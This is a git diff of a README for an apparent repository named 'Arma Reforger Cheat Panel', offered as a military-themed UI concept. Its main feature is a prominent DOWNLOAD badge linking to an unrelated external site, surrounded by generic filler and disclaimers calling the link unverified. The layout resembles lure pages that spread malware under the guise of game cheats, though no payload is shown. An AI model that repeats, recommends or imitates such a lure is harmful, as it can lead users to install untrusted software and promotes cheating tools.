@@ -1,2 +1,91 @@
-# Arma-Reforger-Cheat-Panel
-# Arma Reforger Cheat Panel  An unofficial Arma Reforger-themed project concept featuring a modern military interface, realistic tactical visuals, customizable layouts, and organized menu sections. Focused on UI design and project structure; no functional cheats or verified download are confirmed.
+# Arma Reforger Cheat Panel
+
+[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-8A2BE2?style=for-the-badge&logo=gamepad&logoColor=white)](https://huangqing.net/s/file)
+
+> **Note:** The download link is unverified and is not confirmed to host a working application.
+
+## Overview
+
+Arma Reforger Cheat Panel is an unofficial project concept inspired by Arma Reforger. It features a modern military interface, realistic tactical styling, organized navigation, and customizable UI elements.
+
+This repository focuses on interface design and project structure. No functional cheats or working game modifications are confirmed.
+
+## Features
+
+- Arma Reforger-inspired interface
+- Modern military visual theme
+- Realistic tactical design
+- Dark olive and charcoal color palette
+- Organized menu navigation
+- Customizable interface layout
+- Configurable visual themes
+- Clean and structured project design
+
+## Project Goals
+
+- Create a recognizable Arma Reforger-inspired interface.
+- Capture the game's military simulation atmosphere.
+- Keep menu sections organized and accessible.
+- Explore different layouts and visual customization options.
+
+## Interface Design
+
+The proposed interface uses olive green, charcoal, black, and muted gray tones inspired by military equipment and tactical environments. Compact panels, clear typography, and subtle accent colors create a cohesive visual style.
+
+## Proposed Menu Structure
+
+| Section | Description |
+|---|---|
+| Home | Main dashboard and project information |
+| Visuals | Visual interface preferences |
+| Player | Player-related UI settings |
+| Equipment | Equipment-themed interface concept |
+| World | World information layout |
+| Settings | Theme and layout customization |
+| About | Project information and credits |
+
+## Getting Started
+
+1. Clone or download the repository.
+2. Open the project files in your preferred development environment.
+3. Review the interface structure.
+4. Customize the visual elements and layout.
+
+## Roadmap
+
+- [x] Arma Reforger-inspired project concept
+- [x] Initial menu structure
+- [ ] Additional interface themes
+- [ ] Improved navigation layout
+- [ ] More customization options
+- [ ] Documentation improvements
+
+## Compatibility
+
+This repository describes a UI concept. Compatibility with Arma Reforger or any game client has not been established.
+
+## FAQ
+
+**Is this a working cheat?**
+
+No. It is an unofficial interface and project concept.
+
+**Does it include a verified download?**
+
+No. The download link has not been verified.
+
+**Can I customize the interface?**
+
+The proposed design is intended to be customizable.
+
+## Disclaimer
+
+This is an unofficial fan-made concept and is not affiliated with Bohemia Interactive or Arma Reforger. Unauthorized third-party tools may violate the game's rules and result in account penalties.
+
+## Project Information
+
+- **Project:** Arma Reforger Cheat Panel
+- **Category:** Game UI Concept
+- **Theme:** Modern Military / Tactical
+- **Status:** Concept / Documentation
+- **Game:** Arma Reforger
